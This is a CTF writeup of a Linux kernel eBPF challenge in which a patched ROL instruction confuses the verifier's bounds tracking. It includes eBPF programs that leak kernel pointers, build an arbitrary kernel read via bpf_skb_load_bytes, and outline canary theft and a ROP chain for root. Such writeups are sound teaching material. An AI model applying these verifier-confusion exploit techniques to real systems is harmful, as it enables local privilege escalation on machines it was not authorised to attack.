---
title: DownUnderCTF 2025 - Writeup
author: P0ch1ta
date: 2025-07-22 11:33:00 +0530
categories: [pwning]
tags: [Kernel, CTF, DownUnderCTF, writeups]
math: true
mermaid: true
---

## Introduction

This weekend I was playing DownUnderCTF with my teammates at r3kap1g. We managed to place 2nd in the entire CTF. One of the interesting challenge I was trying was `rolling around`. The challenge was solved by one of my teammate before me during the game. Here is my writeup for the challenge.

## Challenge

The challenge can be found <a href="https://github.com/DownUnderCTF/Challenges_2025_Public/tree/main/pwn/rolling_around/publish">here</a>

This is an eBPF challenge where a kernel patch was applied to create a new `ROL` eBPF instruction. Below is some relevant part of the patch.

```diff
+	ALU_ROL_K:

[1]

+		DST = (((u32)DST) << IMM) | (((u32)DST) >> (32 - IMM));
+		CONT;
+	ALU64_ROL_K:
+		DST = (DST << IMM) | (DST >> (64 - IMM));		
+		CONT;

+static void __scalar32_min_max_rol(struct bpf_reg_state *dst_reg,
+				   u64 umin_val, u64 umax_val)
+{

[2]

+	dst_reg->u32_min_value = (dst_reg->u32_min_value << umin_val) | (dst_reg->u32_min_value >> (64 - umin_val));
+	dst_reg->u32_max_value = (dst_reg->u32_max_value << umax_val) | (dst_reg->u32_max_value >> (64 - umax_val));
+}
```

If we take a look at the 32 bit instruction for `ROL` we see that the verifier at [2] is inconsistent with the instruction at [1]. When we load `0x2` into a register and perform `ROL` with `IMM` as `31` the result is `0x1`, but the verifier would think that it is `0x0` due to the incorrect checks. 

## Debugging

Debugging eBPF can be done using the verifier itself. While loading the eBPF program we can pass the log level in the `bpf_attr` struct.

```c
char log_buf[0x20000];
union bpf_attr attr = {
    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    .insn_cnt = insn_cnt,
    .insns = (uint64_t)prog,
    .license = (uint64_t) "GPL",
    .log_level = 2,
    .log_size = sizeof(log_buf),
    .log_buf = (uint64_t)log_buf,
};
```

Do note that the `log_buf` should be large enough or else the program might crash. Let us now try and load the below sample eBPF program.

```c
#define BPF_ROL 0xe0

int _bpf(int cmd, union bpf_attr *attr, uint32_t size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

int prog_load(struct bpf_insn *prog, int insn_cnt)
{
    int prog_fd;
    char log_buf[0x20000];
    union bpf_attr attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insn_cnt = insn_cnt,
        .insns = (uint64_t)prog,
        .license = (uint64_t) "GPL",
        .log_level = 2,
        .log_size = sizeof(log_buf),
        .log_buf = (uint64_t)log_buf,
    };

    prog_fd = _bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
    printf("[+] log_buf: %s\nLOG_END\n", log_buf);
    if (prog_fd < 0)
    {
        die("[!] Failed to load BPF prog!");
    }
    return prog_fd;
}

int run_prog(int prog_fd, void *payload, size_t payload_size) {
    int ret = -1;
    int socks[2] = {0};
    if(0 != socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
    {
        goto done;
    }

    if(0 != setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(int)))
    {
        goto done;
    }

    if(payload_size != write(socks[1], payload, payload_size))
    {
        goto done;
    }
    ret = 0;

done:
    close(socks[0]);
    close(socks[1]);
    return ret;
}

void test_program(){
    struct bpf_insn leak_prog[] = {

        BPF_MOV32_IMM(BPF_REG_6, 0x2),
        BPF_ALU32_IMM(BPF_ROL, BPF_REG_6, 31),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };


    int prog_fd = prog_load(leak_prog, sizeof(leak_prog) / sizeof(struct bpf_insn));
    printf("[+] prog_fd: %d\n", prog_fd);

    char buf[0x200] = { 0 };

    if (run_prog(prog_fd, buf, 0x200) < 0)
        die("[!] Failed to run prog");
}
```

Upon loading the following we can get the log below:

```
Live regs before insn:
  0: .......... (b4) w6 = 2
  1: ......6... (e4) w6 rol 31
  2: .......... (b7) r0 = 0
  3: 0......... (95) exit
0: R1=ctx() R10=fp0
0: (b4) w6 = 2                        ; R6_w=P2
1: (e4) w6 rol 31

[3]

REG INVARIANTS VIOLATION (alu): range bounds violation u64=[0x2, 0x0] s64=[0x2, 0x0] u32=[0x2, 0x0] s32=[0x2, 0x0] var_off=(0x0, 0x0)
2: R6_w=P0
2: (b7) r0 = 0                        ; R0_w=P0
3: (95) exit
processed 4 insns (limit 1000000) max_states_per_insn 0 total_states 0 peak_states 0 mark_read 0

LOG_END
```

If we then `grep` the string `REG INVARIANTS VIOLATION` in the linux kernel source code, we can see bug.

```c
	verbose(env, "REG INVARIANTS VIOLATION (%s): %s u64=[%#llx, %#llx] "
		"s64=[%#llx, %#llx] u32=[%#x, %#x] s32=[%#x, %#x] var_off=(%#llx, %#llx)\n",
		ctx, msg, reg->umin_value, reg->umax_value,
		reg->smin_value, reg->smax_value,
		reg->u32_min_value, reg->u32_max_value,
		reg->s32_min_value, reg->s32_max_value,
		reg->var_off.value, reg->var_off.mask);
```

Taking a look at the log at [3] we can see that the `umin_value` becomes `2` and `umax_value` becomes `0`. We can use this to our advantage.

So to summarize, we have 2 things at hand:

* Verifier thinking that value is `0x0` but its `0x1`
* The `umin_value` being greater that `umax_value`

## Getting Leak

During the CTF I was trying to leak the kernel `.text` value in the eBPF map, but sadly that's not possible directly do to various checks. Let us try to leak an ebpf-map value.

eBPF maps are key-value data structures used by eBPF programs. They enable sharing of data between eBPF kernel code and user-space applications. The map struct can be found <a href="https://elixir.bootlin.com/linux/v5.18.11/source/include/linux/bpf.h#L158">here</a>

We can use the `bpf_map_lookup_elem()` function to get a pointer to some map field. But the verifier won't allow us to directly leak the pointer. Whenever, operations on pointers are done in eBPF, the function `adjust_ptr_min_max_vals()` is called.

```c
static int adjust_ptr_min_max_vals(struct bpf_verifier_env *env,
				   struct bpf_insn *insn,
				   const struct bpf_reg_state *ptr_reg,
				   const struct bpf_reg_state *off_reg)
{

[Trucated]


	bool known = tnum_is_const(off_reg->var_off);
	s64 smin_val = off_reg->smin_value, smax_val = off_reg->smax_value,
	    smin_ptr = ptr_reg->smin_value, smax_ptr = ptr_reg->smax_value;
	u64 umin_val = off_reg->umin_value, umax_val = off_reg->umax_value,
	    umin_ptr = ptr_reg->umin_value, umax_ptr = ptr_reg->umax_value;
	struct bpf_sanitize_info info = {};
	u8 opcode = BPF_OP(insn->code);
	u32 dst = insn->dst_reg;
	int ret;

	dst_reg = &regs[dst];

	if ((known && (smin_val != smax_val || umin_val != umax_val)) ||
	    smin_val > smax_val || umin_val > umax_val) {
		/* Taint dst register if offset had invalid bounds derived from
		 * e.g. dead branches.
		 */
		__mark_reg_unknown(env, dst_reg);
		return 0;
	}

[Trucated]

}
```

As we can see, if `umin_val` is greater that `umax_val` then the value is marked as unknown i.e. a scalar value which can be written into the map. We can also leak the eBPF stack value similarly. Below is the program to leak values.

```c
    struct bpf_insn leak_prog[] = {
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),       // r8 = r1, save ctx to r8
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_10),      // r9 = rsp
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_9, -0x10),  // r9 = rsp - 0x10
                                                   //
        BPF_LD_MAP_FD(BPF_REG_1, mapfd),            // r1 = map1 fd
        BPF_MOV64_IMM(BPF_REG_0, 0),

        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                 // r2 = rbp
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),                                // r2 = fp -8
        BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),                                  // key = [r2] = 0;
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),  // r0 = map1[0]
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                                // jmp if(r0!=NULL)
        BPF_EXIT_INSN(),                                                      // else exit

        // Bug here
        BPF_MOV32_IMM(BPF_REG_6, 0x2),
        BPF_ALU32_IMM(BPF_ROL, BPF_REG_6, 31),        
        
        // ro contains the map field
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_0),
        // Adding r6 to r0 would make it a scalar
        BPF_ALU64_REG(BPF_ADD, BPF_REG_3, BPF_REG_6),  

        BPF_MOV64_REG(BPF_REG_1, BPF_REG_10),           // r1 = rbp
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, -0x18),       // r1 = rbp - 0x18
        BPF_STX_MEM(BPF_DW, BPF_REG_1, BPF_REG_3, 0),   // *(u64 *)(r1) = r3; 

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_LD_MAP_FD(BPF_REG_1, mapfd),                                      // r1 = map1 fd
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                 // r2 = rbp
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),                                // r2 = fp -8
        BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 1),                                  // key = [r2] = 1;
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),                                 // r3 = rbp
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -0x18),                             // r3 = rbp - 0x18
        BPF_MOV64_IMM(BPF_REG_4, 0),                                          // r4 = 0
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_update_elem),  // r0 = &map1[1]

        // Converting rsp to scalar so that we can write it to the 
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),           
        BPF_ALU64_REG(BPF_ADD, BPF_REG_3, BPF_REG_6),  

        BPF_MOV64_REG(BPF_REG_1, BPF_REG_10),           // r1 = rbp
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, -0x18),       // r1 = rbp - 0x18
        BPF_STX_MEM(BPF_DW, BPF_REG_1, BPF_REG_3, 0),   // *(u64 *)(r1) = r3; 

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_LD_MAP_FD(BPF_REG_1, mapfd),                                      // r1 = map1 fd
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                 // r2 = rbp
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),                                // r2 = fp -8
        BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),                                  // key = [r2] = 1;
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),                                 // r3 = rbp
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -0x18),                             // r3 = rbp - 0x18
        BPF_MOV64_IMM(BPF_REG_4, 0),                                          // r4 = 0
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_update_elem),  // r0 = &map1[1]

        BPF_MOV64_IMM(BPF_REG_0, 0),   
        BPF_EXIT_INSN(),
    };
```

## Arbitrary Read

In order to get arbitrary read primitive, we will exploit incorrect value predicted by the verifier. The function `bpf_skb_load_bytes()` is used to load data from the socket into the eBPF program. One of the parameters that is passed to the function is length of the payload we want to copy. In case if the verifier is in an incorrect state (as in our case) we can compromise the length field and write data on the eBPF stack which would not be known by the eBPF verifier.

We can store a pointer on the eBPF stack. The pointer should be a stack pointer which can be seen as "safe" by the eBPF verifier. Then, we can use the `bpf_skb_load_bytes()` function along with the compromised length value to overwrite the stack pointer into a pointer which we want to read. An example can be found below:

```c
struct bpf_insn leak_prog[] = {
    BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),       // r8 = r1, save ctx to r8
    BPF_MOV64_REG(BPF_REG_9, BPF_REG_10),      // r9 = rsp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_9, -0x10),  // r9 = rsp - 0x10

    BPF_MOV64_REG(BPF_REG_1, BPF_REG_10),           // r1 = rbp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, -0x18),       // r1 = rbp - 0x18
    BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_1, 0),   // *(u64 *)(r9) = r1;

[4]

    BPF_MOV32_IMM(BPF_REG_6, 0x2),
    BPF_ALU32_IMM(BPF_ROL, BPF_REG_6, 31),        
    BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x8),         
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x8),         
    
    BPF_MOV64_REG(BPF_REG_1, BPF_REG_8),             // r1 = ctx
    BPF_MOV64_IMM(BPF_REG_2, 0x10),                  // r2 = offset
    BPF_MOV64_REG(BPF_REG_3, BPF_REG_9),             // r3 = rsp - 0x10
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -0x8),         // r3 = rsp - 0x18
    BPF_MOV64_REG(BPF_REG_4, BPF_REG_6),             // r4 = length
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes),

    BPF_MOV64_REG(BPF_REG_3, BPF_REG_9),             // r3 = rsp - 0x10
    BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_3, 0),    // r3 = *(u64 *)(r3)
    BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_3, 0),    // r3 = *(u64 *)(r3)

    BPF_MOV64_REG(BPF_REG_1, BPF_REG_10),           // r1 = rbp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, -0x18),       // r1 = rbp - 0x18
    BPF_STX_MEM(BPF_DW, BPF_REG_1, BPF_REG_3, 0),   // *(u64 *)(r1) = r3; 

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_LD_MAP_FD(BPF_REG_1, mapfd),                                      // r1 = map1 fd
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                 // r2 = rbp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),                                // r2 = fp -8
    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 1),                                  // key = [r2] = 1;
    BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),                                 // r3 = rbp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -0x18),                             // r3 = rbp - 0x18
    BPF_MOV64_IMM(BPF_REG_4, 0),                                          // r4 = 0
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_update_elem),  // r0 = &map1[1]

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
};
```

At [4] the verifier bug is triggered. The verifier thinks the value is `0x0` but its actually `0x1`. Thus, after multiplication and addition, the verifier tracks the value as `0x8` but its actually `0x10`. We then use this overflow to overwrite the stack pointer at `rsp - 0x10` with a pointer which we want to read. Since the verifier tracks the pointer as a eBPF stack pointer it does the read operation. The value is then stored into a map so that we can access it in user-space.

## Privilege escalation

We can use the `bpf_skb_load_bytes()` to overwrite the return value on the eBPF stack. To do that, we would first need to know the kernel stack canary. Since the kernel stack canary is set at the boot time in the function `boot_init_stack_canary()`. Earlier it could be easily read the canary using arbitrary write, but it changed after the following <a href="https://github.com/torvalds/linux/commit/80d47defddc000271502057ebd7efa4fd6481542">patch</a>. 

In this case, since we have a kernel stack leak, we can just read the canary directly from the stack using the arbitrary read primitive. Then, we can just write a simple ROP chain in order to get shell. The entire exploit can be found <a href="https://raw.githubusercontent.com/manasghandat/manasghandat.github.io/master/assets/exploits/rolling_around.c">here</a>.

